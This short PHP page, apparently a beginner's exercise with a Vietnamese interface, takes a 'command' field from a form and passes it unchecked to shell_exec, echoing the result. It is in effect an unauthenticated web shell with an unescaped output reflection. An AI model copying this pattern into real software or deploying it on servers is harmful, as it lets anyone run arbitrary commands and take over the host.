
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Baloo+2&display=swap" rel="stylesheet">
    <title>Document</title>
</head>
<style>
    body{
        font-family: 'Baloo 2', cursive;
        display:flex;
        height: 100vh;
    }
    .container{
        
        margin: auto;
        display: inline-block;
        padding:20px;
        background-color: antiquewhite;
        border-radius: 10px;
        border: 2px solid #d0cecf
    }
    .btn{
        margin-top: 10px;
        text-decoration: none;
        border: none;
        border-radius: 10px;
        padding: 10px;
        background-color: #fb8178;
        color: aliceblue;
    }
    
    input{
        margin: 20px 0;
        border-radius: 5px;
        text-decoration: none;
        border: none;
        min-height: 20px;
        width:100%;
    }
    h3{
        margin:0;
        text-align: center;
    }
    .btn:hover{
        background-color:#f5594e;
    }
    .btn{
        width: 100%;
    }
    .main{
        display: flex;
        justify-content: center;
        margin: auto;
    }
</style>
<body>
    <div class="main">
        <div class="container">
            <h3>Chạy command bằng webpage</h3>
            <p>Mỗi lệnh ngăn cách nhau bởi dấu ;</p>
            <form action="runCommandByWebPage.php" method="post">
                <label for="firstname">Nhập lệnh</label><br>
                <input type="text" name="command" id="first"><br>
                <label for="secondname">Kết quả</label><br>
                <?php
$command = $_POST['command'];
$output = shell_exec($command);
 echo "<pre><i>$output</i></pre>";
 
?>
                <!--<input type="text" name="out" id="second" value="$output"><br>-->
                <input type="submit" class="btn" value="Submit">
            </form>
        </div>
    </div>
    
</body>
</html>



